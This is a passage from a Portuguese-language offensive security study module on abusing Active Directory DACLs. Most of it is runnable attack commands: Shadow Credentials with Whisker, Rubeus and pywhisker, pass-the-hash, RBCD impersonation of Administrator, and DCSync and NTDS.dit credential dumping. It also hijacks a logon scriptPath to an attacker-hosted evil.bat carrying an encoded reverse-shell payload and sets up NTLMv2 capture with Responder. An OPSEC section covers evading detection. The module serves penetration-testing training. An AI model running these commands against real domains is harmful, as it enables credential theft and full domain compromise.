.\Whisker.exe add /target:alvo /domain:dominio.local /dc:IP_DC /path:chave.pfx /password:senha123

# Usar Rubeus com o pfx gerado
.\Rubeus.exe asktgt /user:alvo /certificate:chave.pfx /password:senha123 /getcredentials /show
```

**Pós-exploração com hash NT recuperado:**
```bash
# PtH
secretsdump.py -hashes :HASH_NT dominio.local/alvo@IP_DC

# PTT com ccache
export KRB5CCNAME=alvo.ccache
psexec.py -k -no-pass alvo.dominio.local
```

**Limpeza:**
```bash
# Listar chaves adicionadas
python3 pywhisker.py -d dominio.local -u usuario -p senha \
    --target alvo --action list

# Remover chave específica pelo DeviceID
python3 pywhisker.py -d dominio.local -u usuario -p senha \
    --target alvo --action remove --device-id DEVICE_ID
```

---

### Logon Scripts (GenericWrite → scriptPath)

`scriptPath` define script executado quando usuário faz logon. Armazenado em SYSVOL/NETLOGON ou caminho UNC.

**Abuso:**
1. Controlar um share UNC acessível pelo DC/cliente
2. Hospedar script malicioso no share
3. Modificar `scriptPath` do usuário alvo para apontar ao share

```bash
# Modificar scriptPath (Linux)
ldapmodify -H ldap://IP_DC \
    -D "dominio\usuario" -w senha << EOF
dn: CN=alvo,CN=Users,DC=dominio,DC=local
changetype: modify
replace: scriptPath
scriptPath: \\ATACANTE_IP\share\evil.bat
EOF
```

```powershell
# PowerView (Windows)
Set-DomainObject -Identity alvo \
    -Set @{scriptPath='\\ATACANTE_IP\share\evil.bat'}

# Verificar
Get-DomainUser alvo | Select scriptPath
```

**Hosting do script malicioso:**
```bash
# Criar share com Impacket smbserver
smbserver.py share /caminho/local -smb2support

# Conteúdo do evil.bat — reverse shell ou beacon
echo "powershell -enc BASE64_PAYLOAD" > evil.bat
```

**Captura de hash NTLMv2** (sem código): Apenas apontar `scriptPath` para `\\ATACANTE\fake` → usuário conecta ao share → Responder captura o hash.

```bash
# Capturar NTLMv2
Responder.py -I eth0 -wrfv
# Crack com hashcat -m 5600
```

---

## GenericAll em Computador

Com GenericAll sobre objeto de computador:

**Opção 1: Shadow Credentials** (recomendado se AD CS disponível)
```bash
python3 pywhisker.py -d dominio.local -u usuario -p senha \
    --target PC01$ --action add --filename pc01_key
```

**Opção 2: Resource-Based Constrained Delegation (RBCD)**
```bash
# Adicionar msDS-AllowedToActOnBehalfOfOtherIdentity
python3 rbcd.py -delegate-from atacante_pc$ \
    -delegate-to PC01$ \
    -dc-ip IP_DC \
    -action write \
    DOMINIO/usuario:senha

# Solicitar TGS impersonando admin
getST.py -spn cifs/PC01.dominio.local \
    -impersonate Administrador \
    -dc-ip IP_DC \
    DOMINIO/atacante_pc$:senha

# Usar ticket
export KRB5CCNAME=Administrador.ccache
secretsdump.py -k -no-pass PC01.dominio.local
```

---

## Cadeia de Escalada Completa (Exemplo Real)

```
Usuário baixo privilégio
    ↓ BloodHound: encontra WriteDacl em grupo "IT Support"
Adiciona GenericAll a si mesmo no grupo via dacledit.py
    ↓ GenericAll no grupo "IT Support"
Adiciona-se ao grupo via net rpc group addmem
    ↓ Membro de "IT Support"
BloodHound: "IT Support" tem GenericAll em "Backup Operators"
    ↓ GenericAll em "Backup Operators"  
Adiciona-se ao Backup Operators
    ↓ SeBackupPrivilege
Copia NTDS.dit via diskshadow + robocopy
    ↓ secretsdump.py LOCAL
Hash NT do Administrator + todos os usuários do domínio
    ↓ Pass-the-Hash
PWNED — Domain Admin
```

---

## Detecção e OPSEC

### Detalhes que geram logs

| Ação | Event ID | Log |
|------|----------|-----|
| Modificar DACL de objeto | 4670 | Security |
| Adicionar membro a grupo | 4728 (global) / 4732 (local) | Security |
| Reset de senha | 4723 / 4724 | Security |
| DCSync (replicação) | 4662 com GUID de replicação | Security |
| LAPS attribute read | 4662 com ms-MCS-AdmPwd | Security |
| Logon script modificado | 5136 (LDAP modify) | Security |
| Shadow Credentials add | 5136 com msDS-KeyCredentialLink | Security |

### Boas práticas OPSEC

**Antes de modificar qualquer DACL:**
```bash
# Sempre fazer backup
dacledit.py -action backup -target OBJETO \
    -filename backup_OBJETO_$(date +%Y%m%d).json \
    DOMINIO/usuario:senha
```

**Minimizar footprint:**
- Preferir leitura (ReadLAPS, ReadGMSA) sobre modificação
- Shadow Credentials > ForceChangePassword (não interrompe o usuário)
- Kerberoasting > reset de senha (menos impacto)
- Remover SPNs temporários após coleta do hash
- Restaurar DACLs originais após escalada

**Timing:**
- Modificações de DACL fora do horário de trabalho = mais suspeito (baseline incomum)
- Horário de trabalho = se mistura com atividade legítima, mas usuário pode notar senha diferente

**Evitar:**
- ForceChangePassword em usuários ativos (interrompe sessão, usuário nota)
- Adicionar-se a grupos de alto privilégio e permanecer (remoção pós-uso)
- Modificar DCL do objeto `Domain` diretamente (muito barulhento — SIEM detecta)

### Restauração pós-exploração

```bash
# Restaurar DACL do backup
dacledit.py -action restore \
    -dc-ip IP_DC \
    -filename backup_OBJETO.json \
    DOMINIO/usuario:senha

# Remover do grupo
net rpc group delmem "Backup Operators" usuario \
    -U "DOMINIO/usuario%senha" -S IP_DC

# Remover SPN
Set-DomainObject -Identity alvo -Clear servicePrincipalName

# Remover shadow credential
python3 pywhisker.py --target alvo --action remove --device-id DEVICE_ID
```

---

## Ferramentas — Resumo

| Ferramenta | Plataforma | Uso |
|------------|-----------|-----|
| `bloodhound-python` | Linux | Coleta de dados AD para BloodHound |
| `SharpHound.exe` | Windows | Coleta de dados AD para BloodHound |
| `dacledit.py` | Linux | Leitura/escrita/backup de DACLs (ShutdownRepo) |
| `owneredit.py` | Linux | Modificar dono de objetos AD |
| `targetedKerberoast.py` | Linux | Kerberoasting de conta específica |
| `LAPSDumper.py` | Linux | Dump de senhas LAPS |
| `gMSADumper.py` | Linux | Dump de senhas GMSA |
| `pywhisker.py` | Linux | Shadow Credentials |
| `PKINITtools` | Linux | PKINIT: gettgtpkinit.py + getnthash.py |
| `secretsdump.py` | Linux | DCSync + dump local NTDS.dit |
| `addusertogroup.py` | Linux | Adicionar usuário a grupo via LDAP |
| `PowerView.ps1` | Windows | Enumeração e modificação AD |
| `Whisker.exe` | Windows | Shadow Credentials |
| `Rubeus.exe` | Windows | Operações Kerberos (TGT, TGS, PKINIT) |
| `Responder.py` | Linux | Captura NTLMv2 via LLMNR/NBT-NS |

---

## Checklist de Enumeração DACL

```
[ ] BloodHound coletado e importado
[ ] Identificar Inbound Control Rights no usuário comprometido
[ ] Identificar Outbound Control Rights do usuário comprometido
[ ] Verificar grupos onde usuário tem AddMember/GenericAll
[ ] Checar se algum grupo alvo tem acesso a recursos críticos
[ ] Verificar WriteDacl/WriteOwner em objetos de alto valor
[ ] Checar AddKeyCredentialLink (Shadow Credentials possível?)
[ ] Verificar ReadLAPSPassword em computadores
[ ] Verificar ReadGMSAPassword em contas de serviço
[ ] Checar DS-Replication rights no objeto Domain
[ ] Verificar ForceChangePassword em usuários de alto privilégio
[ ] Identificar scriptPath modificável (GenericWrite em usuários)
```

---

## Módulos Relacionados

`02_kerberoasting_e_asrep.md` cobre os ataques Kerberos que se beneficiam de DACL abuse. `08_movimentacao_lateral/01_lateral_movement_windows.md` cobre Pass-the-Hash, Pass-the-Ticket, WMI/PSExec. `04_evasao/02_av_evasao_avancada.md` é relevante pra execução de ferramentas. `06_pos_exploracao_windows/03_credenciais_windows.md` cobre secretsdump, Mimikatz, NTDS.dit.

---

## Leitura Complementar

- HTB DACL Attacks I & II — fonte primária deste módulo
- BloodHound Docs — https://bloodhound.readthedocs.io
- ShutdownRepo (dacledit, pywhisker) — https://github.com/ShutdownRepo
- PKINITtools — https://github.com/dirkjanm/PKINITtools
